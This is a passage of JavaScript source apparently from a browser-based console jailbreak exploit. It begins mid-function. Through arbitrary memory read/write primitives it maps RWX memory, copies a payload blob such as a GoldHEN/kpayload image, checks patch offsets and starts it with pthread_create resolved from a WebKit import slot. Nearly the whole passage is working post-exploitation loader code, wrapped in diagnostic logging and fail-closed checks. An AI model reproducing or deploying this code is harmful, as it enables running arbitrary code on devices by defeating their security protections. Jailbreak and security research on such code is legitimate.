  if (m.i32 === -1 || (entry.hi >>> 0) === 0) {
    say("[p] mmap failed, errno " + c.errno()); return false;
  }
  if (fixedBase && !same(entry, fixedBase)) {
    say("[p] mmap did not honor fixed base (got " + text(entry) + "), stopping");
    return false;
  }
  
  for (let o = 0; o < size; o += 0x1000) wr4(plus(entry, o), 0);
  saySync("[p] 3 mprotect rwx");
  if (sc(S.mprotect, entry, size, 7).i32 !== 0) {
    say("[p] mprotect rwx failed, errno " + c.errno()); return false;
  }
  codeAt(entry, 0).hex("c3");
  saySync("[p] 4 ring3 ret probe");
  const probe = c.callAddr(entry, []);
  if (probe === undefined || probe === null) {
    say("[p] entry page does not execute in ring 3 -- stopping"); return false;
  }
  say("[p] entry page executes in ring 3, loading payload");

  saySync("[p] 5 copy image bytes=" + blob.length);
  for (let o = 0; o < blob.length; o += 8) {
    let lo = 0, hi = 0;
    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
    c.p.write8(plus(entry, o), v(lo >>> 0, hi >>> 0));
  }
  for (let o = 0; o < blob.length; o += 8) {
    let lo = 0, hi = 0;
    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
    const q = c.p.read8(plus(entry, o));
    if ((q.low >>> 0) !== (lo >>> 0) || (q.hi >>> 0) !== (hi >>> 0)) {
      say("[p] copy mismatch at 0x" + o.toString(16)); return false;
    }
  }
  
  // Read-only validation of the ORIGINAL payload bytes before existing patches.
  // No expected instruction signature has been established for this payload.
  // Therefore report observed bytes and mapping agreement, not "compatible".
  const patchSites = [
    {offset: 0x1068, length: 10, operation: "nop-console-write"},
    {offset: 0x1136, length: 4, operation: "nop-kpayload-call"},
    {offset: 0x3490, length: 4, operation: "replace-m-temp"}
  ];
  for (const site of patchSites) {
    const inBounds = site.offset >= 0 && site.offset + site.length <= blob.length;
    if (!inBounds) {
      say("[PBYTE-DIAG] offset=0x" + site.offset.toString(16)
          + " | operation=" + site.operation + " | status=out-of-bounds | validation=failed");
      return false;
    }
    const original = Array.from(blob.slice(site.offset, site.offset + site.length));
    const observed = [];
    for (let j = 0; j < site.length; j++) {
      // Read mapped memory only; this does not modify payload or kernel memory.
      observed.push(c.p.read1(plus(entry, site.offset + j)) & 0xff);
    }
    const hex = bytes => bytes.map(b => b.toString(16).padStart(2, "0")).join("");
    const matches = original.every((b, j) => b === observed[j]);
    say("[PBYTE-DIAG] offset=0x" + site.offset.toString(16)
        + " | operation=" + site.operation
        + " | fileBytes=" + hex(original) + " | mappedBytes=" + hex(observed)
        + " | copyMatch=" + matches + " | expectedSignature=unknown"
        + " | instructionMeaning=unverified");
    if (!matches) {
      say("[PBYTE-DIAG] status=aborted | reason=prepatch-copy-mismatch");
      return false;
    }
  }
  say("[PBYTE-DIAG] status=prepatch-check-complete | copyMatch=true"
      + " | patchCompatibility=unverified | noAdditionalWrites=true");

  // rawcopy=1 is an explicit opt-in for payloads that carry their own loader
  // (e.g. goldhen.bin = loader + compressed kpayload). Those must be started
  // at their own entry without this host's 0x1068/0x1136/0x3490 edits.
  // Default stays fail-closed.
  if (RAWC) {
    saySync("[p] 6 payload patch table skipped (rawcopy) | 7 payload patches skipped");
    say("[p] rawcopy=1 -- no payload bytes patched, starting thread at entry");
  } else {
    // Fail closed: this loader assumes a kernel-entry CALL at 0x1136.
    // A relative direct CALL is five bytes and begins with 0xE8.
    // Never overwrite arbitrary instructions or try to guess a replacement.
    saySync("[p] 6 payload patch table skipped (14.02 uses the JS patch table)");
    saySync("[p] 7 payload patch gate");
    const kernelCallOpcode = blob[0x1136];
    if (kernelCallOpcode !== 0xE8) {
      say("[PSIG-DIAG] status=blocked | offset=0x1136 | observed="
          + Array.from(blob.slice(0x1136, 0x113a)).map(b => b.toString(16).padStart(2, "0")).join(" ")
          + " | expected=E8+rel32 | reason=kernel-entry-call-signature-mismatch"
          + " | writesApplied=false | threadStarted=false");
      return false;
    }
    // A matching opcode alone is not proof of a compatible patch site.
    // Refuse to proceed until a verified signature and patch length exist.
    say("[PSIG-DIAG] status=blocked | offset=0x1136"
        + " | reason=complete-verified-signature-unavailable"
        + " | writesApplied=false | threadStarted=false");
    return false;
  }

  say("[p] payload copied and verified, starting thread");
  say("[PDIAG] phase=entry-ready | entry=" + text(entry)
      + " | mappedBytes=" + size + " | firstJumpTargetOffset=0x" + jumpTarget.toString(16)
      + " | kernelEntryCall=bypassed | payloadCodePatched=" + (!RAWC));

  const SLOT_1352 = 0x3cb9c00;
  const slot = (c.off && c.off.wk___imp_pthread_create !== undefined)
    ? c.off.wk___imp_pthread_create : SLOT_1352;
  if (!c.webkitBase || !c.libkernelBase) {
    say("[p] no module bases -- payload sits loaded at " + text(entry) + ", not started");
    return false;
  }
  const fnr = c.p.read8(c.webkitBase.add32(slot));
  const fn = v(fnr.low, fnr.hi);
  const d = (fn.hi - (c.libkernelBase.hi >>> 0)) * LOW + (fn.low - (c.libkernelBase.low >>> 0));
  if ((fn.hi >>> 0) !== (c.libkernelBase.hi >>> 0) || d <= 0 || d > 0x400000) {
    say("[p] slot +0x" + slot.toString(16) + " holds " + text(fn)
        + ", not inside libkernel " + text(c.libkernelBase) + " -- not calling it");
    return false;
  }
  say("[p] pthread_create at " + text(fn) + " = libkernel +0x" + d.toString(16));

  const thr = alloc(8);
  thr.u8.fill(0);
  saySync("[p] 8 pthread_create entry=" + text(entry) + " rc=pending");
  const rc = c.callAddr(fn, [thr.at, 0, entry, 0]).i32;
  const handle = qAt(thr, 0);
  const started = rc === 0 && ((handle.low >>> 0) !== 0 || (handle.hi >>> 0) !== 0);
  say("[PDIAG] phase=thread-return | rc=" + rc + " | handle=" + text(handle)
      + " | created=" + started + " | state=unknown | joined=false");
  say("[p] " + blob.length + " bytes at " + text(entry) + ", thread rc=" + rc
      + (started ? " -- running" : " -- did NOT start"));
  say("[PDIAG] phase=initialization | payload=" + url
      + " | threadCreated=" + started + " | acknowledged=false"
      + " | confirmation=unavailable | note=no-payload-side-handshake");
  return started;
}

/* End of file */
export async function runAfterglow(ctx, opts) {
  // Install the host before logging: say() calls host(), which requires STATE.ctx.
  STATE.ctx = ctx;
  say("[FLOW-DIAG] stage=run-enter");
  // Crash containment: never retry a kernel attempt in this diagnostic build.
  const max = 1;
  say("[FLOW-DIAG] stage=retry-policy maxAttempts=1 autoRetry=false");
  for (let n = 1; n <= max; n++) {
    say("[FLOW-DIAG] stage=kernel-attempt attempt=" + n);
    let r;
    try { r = await attempt(ctx, opts); }
    catch (e) { say("[FLOW-DIAG] stage=exception attempt=" + n + " error=" + String(e)); throw e; }
    say("[FLOW-DIAG] stage=kernel-result attempt=" + n + " resultType=" + typeof r + " result=" + Boolean(r));
    if (r) { say("[FLOW-DIAG] stage=run-exit result=success"); return r; }
    say("[FLOW-DIAG] stage=run-exit result=false reason=single-attempt-policy retryRequested=" + Boolean(STATE.retry));
    return false;

  }
  return false;
}
